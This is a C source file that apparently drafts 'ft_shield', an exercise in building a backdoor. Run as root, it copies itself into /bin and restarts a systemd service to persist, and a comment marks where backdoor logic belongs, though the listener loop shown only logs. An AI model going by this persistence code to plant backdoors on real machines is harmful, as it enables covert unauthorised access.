#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <syslog.h>

#define BIN_PATH "/bin/ft_shield"
#define EXE_PATH "/home/s/sh/a.out"


void	server()
{
	while (1)
	{
		syslog(LOG_INFO, "listening...\n");
		sleep(5);
	}
	syslog(LOG_INFO, "loop exited\n");
}

int	egg_plant(char *exec_path)
{
	int	bin; // file descriptor of /bin/ft_shield
	int	usr; // file descriptor of program that user ran
	int	ret;
	char	buffer[1024];

	bin = open(BIN_PATH, O_CREAT | O_WRONLY | O_TRUNC, 755);
	if (bin < 0)
	{
		return (-1);
	}
	usr = open(EXE_PATH, O_RDONLY);
	if (usr < 0)
	{
		close(bin);
		return (-2);
	}
	while ((ret = read(usr, buffer, 1024)))
		write(bin, buffer, ret);
	close(bin);
	close(usr);
	return (0);
}

int	main(int argc, char **argv)
{
	int	len;
	char	exec_path[256];

	syslog(LOG_INFO, "this is first line of main\n");
	openlog("ft_shield", LOG_PID | LOG_CONS, LOG_USER);
	if (geteuid())
	{
		printf("root permission required\n");
		return (-1);
	}
	len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);
	if (len != -1)
	{
		exec_path[len] = '\0';
		syslog(LOG_INFO, "exec path: %s\n", exec_path);
		// printf("%s\n", exec_path);
	}
	else
	{
		// perror("readlink");
		printf("readlink failed\n");
	}
	// printf("%s == \"/home/s/sh/a.out\"\n", exec_path);
	syslog(LOG_INFO, "/proc/self/exe: %s", exec_path);
	if (strcmp(exec_path, EXE_PATH) == 0)
	{
		// ft_shield.out
		egg_plant(exec_path); // copy binary to /bin directory
		syslog(LOG_INFO, "service_start");
		// printf("service start\n");
		system("systemctl daemon-reload");
		system("systemctl restart ft_shield");
	}
	else
	{
		// ft_shield.service
		syslog(LOG_INFO, "server\n");
		// main logic for setting backdoor
		server();
	}
	syslog(LOG_INFO, "end of main function\n");
	closelog();
	return (0);
}
